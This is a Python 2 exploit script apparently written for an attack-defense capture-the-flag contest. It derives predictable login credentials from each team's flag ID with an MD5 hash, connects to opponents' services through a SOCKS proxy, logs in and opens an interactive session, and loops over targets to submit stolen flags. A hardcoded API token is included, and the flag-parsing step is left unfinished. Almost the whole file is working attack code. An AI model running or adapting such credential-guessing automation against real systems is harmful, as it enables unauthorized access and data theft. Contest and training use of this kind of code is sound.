#!/usr/bin/env python2
# -*- coding: utf-8 -*-

import json
from swpag_client import Team # pip install swpag_client
import socks # pip install PySocks
import socket
from pwn import *
import time

def gen_credentials(flag_id):
    LEGITIMATE_USERNAME = ["LetMeFly","TryThis","DogHater","test0001","fanqiang","l33tM0rE","sH3Rl0cK","d0YleCon"]
    import md5
    m = md5.new()
    m.update(flag_id)
    digest = m.hexdigest()
    index = int(digest, 16) % len(LEGITIMATE_USERNAME)
    return LEGITIMATE_USERNAME[index] + digest[0 : 10] #, digest

def hostToIP(host):
	num = int(host.replace("team",""))
	part = "{0}.{1}".format(129+((num&0xff00)>>8),(num&0xff))
	return "172.31."+part

def runJob(d):
	# any stdout in here gets redirected to the log file
	# you can check this log by either looking at the log file (same directory),
	# or by using the command 'print <job name> [number of lines]' in the launcher

	try:
		s = remote(hostToIP(d['hostname']), 20003, timeout=0.05)
	except:
		return ""

	username = gen_credentials(d['flag_id'])

	log.info(username)
	s.sendline("L")
	s.sendline("%s" % username + "_password")
	s.interactive()


	flag = ""
	return flag.split("\\n")[0].replace("\"","").replace("}","")
 
def fakeJob(ip):
	return True # Return anything not False here

'''
	   {
           'team_name' : "Team name",
           'hostname' : "hostname",
           'port' : <int port number>,
           'flag_id' : "Flag ID to steal",
           'team_id': <int team id>
       },
'''

if __name__ == "__main__":
	context.proxy=(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4447)
	socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, '127.0.0.1', 4447)
	socket.socket = socks.socksocket
	while(1):
   		t = Team(None, "muVraUlLU7m0MM9dmg4P4auy59t5PFdg")
		targets = t.get_targets("marvelous")
		for target in targets:
			flag = runJob(target)
			if (flag):
				t.submit_flag([flag])
		print "Waiting for next round plz"
		time.sleep(60)



